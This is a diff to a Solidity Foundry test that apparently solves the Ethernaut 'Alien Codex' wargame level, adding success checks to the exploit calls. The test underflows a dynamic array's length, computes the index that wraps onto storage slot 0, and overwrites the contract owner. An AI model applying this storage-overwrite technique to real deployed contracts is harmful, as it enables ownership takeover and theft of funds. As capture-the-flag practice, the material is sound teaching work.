@@ -61,8 +61,10 @@ contract AlienCodexTest is Test {
          * ...
          * SLOT0 codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0!
          */
-        alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
-        alienCodexContract.call(abi.encodeWithSignature("retract()"));
+        (bool successMakeContact, ) =alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
+        require(successMakeContact);
+        (bool successRetract, ) =alienCodexContract.call(abi.encodeWithSignature("retract()"));
+        require(successRetract);
 
         uint codexIndexForSlotZero = ((2**256) - 1) -
             uint(keccak256(abi.encode(1))) +
@@ -71,20 +73,22 @@ contract AlienCodexTest is Test {
 
         // must be uint256 in function signature not uint
         // call revise with codex index and content which will set you as the owner
-        alienCodexContract.call(
+        (bool succcessRevise,) = alienCodexContract.call(
             abi.encodeWithSignature(
                 "revise(uint256,bytes32)",
                 codexIndexForSlotZero,
                 leftPaddedAddress
             )
         );
+        require(succcessRevise);
 
         /******************
          *Level Submission*
          ***************  */
-        (bool success, bytes memory data) = alienCodexContract.call(
+        (bool successOwner, bytes memory data) = alienCodexContract.call(
             abi.encodeWithSignature("owner()")
         );
+        require(successOwner);
         address refinedData = address(
             uint160(bytes20(uint160(uint256(bytes32(data)) << 0)))
         );
